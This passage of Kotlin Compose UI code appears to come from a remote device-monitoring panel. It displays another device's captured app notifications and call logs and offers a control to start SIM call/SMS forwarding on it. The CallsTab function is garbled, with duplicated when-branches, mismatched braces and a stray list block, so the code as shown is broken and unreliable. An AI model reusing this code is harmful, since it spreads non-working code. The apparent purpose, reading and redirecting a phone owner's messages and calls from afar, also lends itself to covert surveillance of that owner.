                        bitmap = bitmap.asImageBitmap(),
                        contentDescription = null,
                        modifier = Modifier.size(32.dp)
                    )
                    iconSet = true
                }
            }
            if (!iconSet) {
                Icon(
                    imageVector = getAppIcon(notification.packageName),
                    contentDescription = null,
                    tint = MaterialTheme.colorScheme.secondary,
                    modifier = Modifier.size(32.dp)
                )
            }
        }
    )

    if (showActionSheet) {
        val actionContext = LocalContext.current
        ActionSheet(
            onDismiss = { showActionSheet = false },
            actions = listOf(
                ActionItem("Copy Message", Icons.Default.ContentCopy) {
                    copyToClipboard(actionContext, notification.text)
                    scope.launch { snackbarHostState.showSnackbar("Message copied") }
                    showActionSheet = false
                },
                ActionItem("Copy Full Info", Icons.AutoMirrored.Filled.Assignment) {
                    copyToClipboard(actionContext, "[${formatDate(notification.timestamp, false)}] ${notification.title}\n${notification.text}")
                    scope.launch { snackbarHostState.showSnackbar("Notification copied") }
                    showActionSheet = false
                }
            )
        )
    }
    HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp), thickness = 0.5.dp)
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun CallsTab(viewModel: DeviceDetailViewModel, listState: LazyListState) {
    val callsState by viewModel.callLogs.collectAsStateWithLifecycle()
    val calls = (callsState as? TabUiState.Success<CallLog>)?.items ?: emptyList()
    val filter by viewModel.callFilter.collectAsStateWithLifecycle()
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val snackbarHostState = remember { SnackbarHostState() }

    var itemToDelete by remember { mutableStateOf<CallLog?>(null) }

    Box(modifier = Modifier.fillMaxSize()) {
        when (val state = callsState) {
            is TabUiState.Loading -> {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    CircularProgressIndicator()
                }
            )

            when {
                callsState is TabUiState.Loading -> LoadingState("Loading call logs...")
                callsState is TabUiState.Error -> TabErrorState((callsState as TabUiState.Error).message, (callsState as TabUiState.Error).trace)
                calls.isEmpty() -> EmptyState("No call logs found")
                else -> {
                LazyColumn(
                    state = listState,
                    contentPadding = PaddingValues(bottom = 80.dp),
                    modifier = Modifier.fillMaxSize()
                ) {
                    items(calls, key = { it.id.ifBlank { hashString("${it.number}${it.date}${it.type}") } }) { call ->
                        val dismissState = rememberSwipeToDismissBoxState(
                            confirmValueChange = {
                                when (it) {
                                    SwipeToDismissBoxValue.StartToEnd -> {
                                        copyToClipboard(context, "${call.name} (${call.number}) - ${formatDate(call.date)}")
                                        scope.launch { snackbarHostState.showSnackbar("Call info copied") }
                                        false
                                    }
                                    SwipeToDismissBoxValue.EndToStart -> {
                                        itemToDelete = call
                                        false
                                    }
                                    else -> false
                                }
                            }
                        }
                    )
                    EmptyState("No call logs found")
                }
            }
            is TabUiState.Success -> {
                val calls = state.data
                Column(modifier = Modifier.fillMaxSize()) {
                    TabHeader(
                        title = "${calls.size} Calls",
                        onCopyAll = {
                            val text = calls.joinToString("\n") { "[${formatDate(it.date, false)}] ${it.name} (${it.number}) - ${it.duration}s" }
                            copyToClipboard(context, text)
                            scope.launch { snackbarHostState.showSnackbar("All visible calls copied") }
                        },
                        onDeleteAll = { viewModel.deleteAllVisible("calllogs", calls) },
                        extraContent = {
                            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                                FilterChip(selected = filter == 0, onClick = { viewModel.setCallFilter(0) }, label = { Text("All") })
                                FilterChip(selected = filter == 1, onClick = { viewModel.setCallFilter(1) }, label = { Text("Incoming") })
                                FilterChip(selected = filter == 2, onClick = { viewModel.setCallFilter(2) }, label = { Text("Outgoing") })
                                FilterChip(selected = filter == 3, onClick = { viewModel.setCallFilter(3) }, label = { Text("Missed") })
                            }
                        }
                    )

                    LazyColumn(
                        state = listState,
                        contentPadding = PaddingValues(bottom = 80.dp),
                        modifier = Modifier.fillMaxSize()
                    ) {
                        items(calls, key = { it.id.ifBlank { hashString("${it.number}${it.date}${it.type}") } }) { call ->
                            val dismissState = rememberSwipeToDismissBoxState(
                                confirmValueChange = {
                                    when (it) {
                                        SwipeToDismissBoxValue.StartToEnd -> {
                                            copyToClipboard(context, "${call.name} (${call.number}) - ${formatDate(call.date)}")
                                            scope.launch { snackbarHostState.showSnackbar("Call info copied") }
                                            false
                                        }
                                        SwipeToDismissBoxValue.EndToStart -> {
                                            itemToDelete = call
                                            false
                                        }
                                        else -> false
                                    }
                                }
                            )

                            SwipeToDismissBox(
                                state = dismissState,
                                backgroundContent = { DismissBackground(dismissState) },
                                modifier = Modifier
                            ) {
                                CallItem(
                                    call = call,
                                    onCopyNumber = {
                                        copyToClipboard(context, call.number)
                                        scope.launch { snackbarHostState.showSnackbar("Number copied") }
                                    },
                                    onCopyFull = {
                                        copyToClipboard(context, "[${formatDate(call.date, false)}] ${call.name} (${call.number}) - ${call.duration}s")
                                        scope.launch { snackbarHostState.showSnackbar("Call details copied") }
                                    }
                                )
                            }
                            HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp), thickness = 0.5.dp)
                        }
                    }
                }
            }
        }
        SnackbarHost(hostState = snackbarHostState, modifier = Modifier.align(Alignment.BottomCenter))

        if (itemToDelete != null) {
            DeleteConfirmationDialog(
                onConfirm = {
                    viewModel.deleteItem("calllogs", itemToDelete!!.id)
                    itemToDelete = null
                },
                onDismiss = { itemToDelete = null }
            )
        }
    }
}

@OptIn(ExperimentalFoundationApi::class)
@Composable
fun CallItem(call: CallLog, onCopyNumber: () -> Unit, onCopyFull: () -> Unit) {
    var showActionSheet by remember { mutableStateOf(false) }

    ListItem(
        modifier = Modifier.combinedClickable(
            onClick = onCopyNumber,
            onLongClick = { showActionSheet = true }
        ),
        headlineContent = { Text(if (call.name == "Unknown" || call.name.isBlank()) call.number else call.name, fontWeight = FontWeight.Bold) },
        supportingContent = {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(
                    imageVector = getCallTypeIcon(call.type),
                    contentDescription = null,
                    modifier = Modifier.size(14.dp),
                    tint = getCallTypeColor(call.type)
                )
                Spacer(modifier = Modifier.width(4.dp))
                Text("${call.number} • ${call.duration}s")
            }
        },
        trailingContent = { Text(formatDate(call.date), style = MaterialTheme.typography.labelSmall) }
    )

    if (showActionSheet) {
        ActionSheet(
            onDismiss = { showActionSheet = false },
            actions = listOf(
                ActionItem("Copy Number", Icons.Default.ContentCopy) {
                    onCopyNumber()
                    showActionSheet = false
                },
                ActionItem("Copy Full Details", Icons.AutoMirrored.Filled.Assignment) {
                    onCopyFull()
                    showActionSheet = false
                }
            )
        )
    }
}

fun getAppIcon(packageName: String): ImageVector {
    return when {
        packageName.contains("whatsapp") -> Icons.Default.Email
        packageName.contains("facebook") || packageName.contains("messenger") -> Icons.Default.Face
        packageName.contains("instagram") -> Icons.Default.AccountBox
        packageName.contains("gmail") -> Icons.Default.Email
        else -> Icons.Default.Notifications
    }
}

fun getCallTypeIcon(type: Int): ImageVector {
    return when (type) {
        1 -> Icons.Default.Call // Incoming
        2 -> Icons.AutoMirrored.Filled.Send // Outgoing
        3 -> Icons.Default.Call // Missed
        else -> Icons.Default.Call
    }
}

@Composable
fun TabHeader(
    title: String,
    onCopyAll: () -> Unit,
    onDeleteAll: () -> Unit,
    extraContent: @Composable () -> Unit = {}
) {
    var showDeleteAllConfirm by remember { mutableStateOf(false) }

    Column(modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 8.dp)) {
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(title, style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
            Row {
                IconButton(onClick = onCopyAll) {
                    Icon(Icons.Default.ContentCopy, "Copy all")
                }
                IconButton(onClick = { showDeleteAllConfirm = true }) {
                    Icon(Icons.Default.DeleteSweep, "Delete all", tint = MaterialTheme.colorScheme.error)
                }
            }
        }
        extraContent()
    }

    if (showDeleteAllConfirm) {
        AlertDialog(
            onDismissRequest = { showDeleteAllConfirm = false },
            title = { Text("Delete All Data") },
            text = { Text("Are you sure you want to delete all visible data in this tab? This action cannot be undone.") },
            confirmButton = {
                TextButton(
                    onClick = {
                        onDeleteAll()
                        showDeleteAllConfirm = false
                    },
                    colors = ButtonDefaults.textButtonColors(contentColor = MaterialTheme.colorScheme.error)
                ) {
                    Text("Delete All")
                }
            },
            dismissButton = {
                TextButton(onClick = { showDeleteAllConfirm = false }) {
                    Text("Cancel")
                }
            }
        )
    }
}

@Composable
fun LoadingState(message: String) {
    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            CircularProgressIndicator()
            Spacer(modifier = Modifier.height(16.dp))
            Text(message, color = MaterialTheme.colorScheme.onSurfaceVariant)
        }
    }
}

@Composable
fun TabErrorState(message: String, trace: String = "") {
    val context = LocalContext.current
    Box(modifier = Modifier.fillMaxSize().padding(24.dp), contentAlignment = Alignment.Center) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Default.Error, null, modifier = Modifier.size(48.dp), tint = MaterialTheme.colorScheme.error)
            Spacer(modifier = Modifier.height(12.dp))
            Text(message, color = MaterialTheme.colorScheme.error)
            Spacer(modifier = Modifier.height(12.dp))
            OutlinedButton(onClick = { copyToClipboard(context, if (trace.isBlank()) message else "$message\n$trace") }) {
                Icon(Icons.Default.ContentCopy, contentDescription = null, modifier = Modifier.size(18.dp))
                Spacer(modifier = Modifier.width(8.dp))
                Text("Copy Debug Info")
            }
        }
    }
}

@Composable
fun EmptyState(message: String) {
    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Default.Inbox, null, modifier = Modifier.size(64.dp), tint = MaterialTheme.colorScheme.outline)
            Spacer(modifier = Modifier.height(16.dp))
            Text(message, color = MaterialTheme.colorScheme.onSurfaceVariant)
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DismissBackground(dismissState: SwipeToDismissBoxState) {
    val color = when (dismissState.dismissDirection) {
        SwipeToDismissBoxValue.StartToEnd -> Color(0xFF4CAF50) // Green for copy
        SwipeToDismissBoxValue.EndToStart -> MaterialTheme.colorScheme.error
        else -> Color.Transparent
    }
    val direction = dismissState.dismissDirection

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(color)
            .padding(horizontal = 20.dp),
        contentAlignment = when (direction) {
            SwipeToDismissBoxValue.StartToEnd -> Alignment.CenterStart
            SwipeToDismissBoxValue.EndToStart -> Alignment.CenterEnd
            else -> Alignment.Center
        }
    ) {
        Icon(
            imageVector = when (direction) {
                SwipeToDismissBoxValue.StartToEnd -> Icons.Default.ContentCopy
                SwipeToDismissBoxValue.EndToStart -> Icons.Default.Delete
                else -> Icons.Default.Delete
            },
            contentDescription = null,
            tint = Color.White
        )
    }
}

@Composable
fun DeleteConfirmationDialog(onConfirm: () -> Unit, onDismiss: () -> Unit) {
    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text("Confirm Delete") },
        text = { Text("Are you sure you want to delete this item? This action cannot be undone.") },
        confirmButton = {
            TextButton(
                onClick = onConfirm,
                colors = ButtonDefaults.textButtonColors(contentColor = MaterialTheme.colorScheme.error)
            ) {
                Text("Delete")
            }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) {
                Text("Cancel")
            }
        }
    )
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ForwardingBottomSheet(title: String, device: Device, onDismiss: () -> Unit) {
    var selectedSim by remember {
        mutableIntStateOf(
            if (device.sim1Ready) 1 else if (device.sim2Ready) 2 else 0
        )
    }

    var forwardingNumber by remember { mutableStateOf("") }

    ModalBottomSheet(
        onDismissRequest = onDismiss,
        sheetState = rememberModalBottomSheetState()
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(bottom = 32.dp, start = 16.dp, end = 16.dp)
        ) {
            Text(title, style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.Bold)
            Spacer(modifier = Modifier.height(16.dp))

            Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                if (device.sim1Ready) {
                    FilterChip(selected = selectedSim == 1, onClick = { selectedSim = 1 }, label = { Text("SIM 1") })
                }
                if (device.sim2Ready) {
                    FilterChip(selected = selectedSim == 2, onClick = { selectedSim = 2 }, label = { Text("SIM 2") })
                }
                if (!device.sim1Ready && !device.sim2Ready) {
                    FilterChip(selected = true, onClick = { }, label = { Text("No SIM available") })
                }
            }

            Spacer(modifier = Modifier.height(16.dp))

            if (!device.sim1Ready && !device.sim2Ready) {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f))
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text("No SIM available", fontWeight = FontWeight.SemiBold)
                        Text("Call/SMS forwarding requires an active SIM card.", style = MaterialTheme.typography.bodySmall)
                    }
                }
            } else {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f))
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        val carrier = if (selectedSim == 1) device.sim1Carrier else device.sim2Carrier
                        val number = if (selectedSim == 1) device.sim1Number else device.sim2Number

                        Text("SIM $selectedSim: Active", fontWeight = FontWeight.SemiBold)
                        Text("Carrier: ${carrier.ifBlank { "Unknown" }}", style = MaterialTheme.typography.bodySmall)
                        Text("Number: ${number.ifBlank { "Number unavailable" }}", style = MaterialTheme.typography.bodySmall)
                        Spacer(modifier = Modifier.height(8.dp))
                        OutlinedTextField(
                            value = forwardingNumber,
                            onValueChange = { forwardingNumber = it },
                            label = { Text("Forwarding number") },
                            modifier = Modifier.fillMaxWidth(),
                            placeholder = { Text("+1...") },
                            shape = RoundedCornerShape(8.dp)
                        )
                        Spacer(modifier = Modifier.height(16.dp))
                        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.End) {
                            TextButton(onClick = {}, enabled = false) { Text("Stop") }
                            Button(onClick = {}, enabled = forwardingNumber.isNotBlank()) { Text("Start Forwarding") }
                        }
                    }
                }
            }

            Spacer(modifier = Modifier.height(16.dp))
            Text("This is an engineering reference for SIM-based forwarding control.", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.secondary)
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ActionSheet(onDismiss: () -> Unit, actions: List<ActionItem>) {
    ModalBottomSheet(
        onDismissRequest = onDismiss,
        sheetState = rememberModalBottomSheetState()
    ) {
        Column(modifier = Modifier.padding(bottom = 32.dp)) {
            actions.forEach { item ->
                ListItem(
                    modifier = Modifier.clickable { item.onClick() },
                    headlineContent = { Text(item.label) },
                    leadingContent = { Icon(item.icon, null) }
                )
            }
        }
    }
}

data class ActionItem(val label: String, val icon: ImageVector, val onClick: () -> Unit)

@Composable
fun getCallTypeColor(type: Int): Color {
    return when (type) {
        1 -> Color(0xFF4CAF50) // Green
        2 -> Color(0xFF2196F3) // Blue
        3 -> Color(0xFFF44336) // Red
        else -> MaterialTheme.colorScheme.outline
    }
}
